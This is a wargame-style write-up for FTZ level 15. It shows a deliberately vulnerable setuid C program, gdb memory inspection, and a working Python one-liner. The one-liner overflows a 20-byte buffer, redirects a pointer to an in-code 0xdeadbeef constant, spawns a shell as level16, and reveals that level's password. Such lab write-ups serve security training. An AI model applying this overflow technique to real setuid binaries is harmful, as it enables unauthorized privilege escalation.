# Level15

## This level's goal
- Memory routine pointer

***

```
[level15@ftz level15]$ ls -l
-rwsr-x---    1 level16  level15     13801 Dec 10  2002 attackme
-rw-r-----    1 root     level15       185 Dec 10  2002 hint

[level15@ftz level15]$ cat hint

#include <stdio.h>

main()
{ 
  int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
}
```

This level seems like level14, but there is the difference of check's pointer.

```
[level15@ftz tmp]$ cat distance.c
#include <stdio.h>
main()
{
  int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
   printf("Input is : %s\n &buf   : %p\n &check : %p\n &crap  : %p\n", buf, buf, &check, &crap);
}

[level15@ftz tmp]$ gcc distance.c -o distance
[level15@ftz tmp]$ ./distance
Input is :
 &buf   : 0xbffff3a0
 &check : 0xbffff3c8
 &crap  : 0xbffff3cc
```

As above, buf(20bytes) + dummy(20bytes) + \*check(4bytes) + crap(4bytes) + dummy(8bytes) + SFP(4bytes) + RET(4bytes)

```
[level15@ftz level15]$ gdb -q tmp/attackme
(gdb) disas main
0x080484b0 <main+32>:   cmpl   $0xdeadbeef,(%eax)
(gdb) break *0x080484b0
(gdb) run
(gdb) x/16x $esp
0xbfffe3b0:     0x41414141      0x4213000a      0xbfffe3d8      0x08048471
0xbfffe3c0:     0x08049560      0x08049668      0x4001582c      0x080483be
0xbfffe3d0:     0x08048308      0x42130a14      0xbfffe3e8      0x0804831e
0xbfffe3e0:     0x4200af84      0x42130a14      0xbfffe408      0x42015574

(gdb) x/x 0xbfffe3e8
0xbfffe3e8:     0xbfffe408

(gdb) x/x 0xbfffe408
0xbfffe408:     0x00000000

(gdb) info registers
eip            0x80484b0        0x80484b0

(gdb) x/4x 0x80484b0
0x80484b0 <main+32>:    0xbeef3881      0x2575dead      0x6808ec83      0x00000c18

(gdb) x/4x 0x80484b2
0x80484b2 <main+34>:    0xdeadbeef      0xec832575      0x0c186808      0x18680000
```

The deadbeef's memory is 0x80484b2, so the attack code is 40 bytes dummy strings + "\xb2\x84\x04\x08".

```
[level15@ftz level15]$ (python -c 'print "A"*40+"\xb2\x84\x04\x08"'; cat) | ./attackme
id
uid=3096(level16) gid=3095(level15) groups=3095(level15)

my-pass
Level16 Password is "about to cause mass".
```
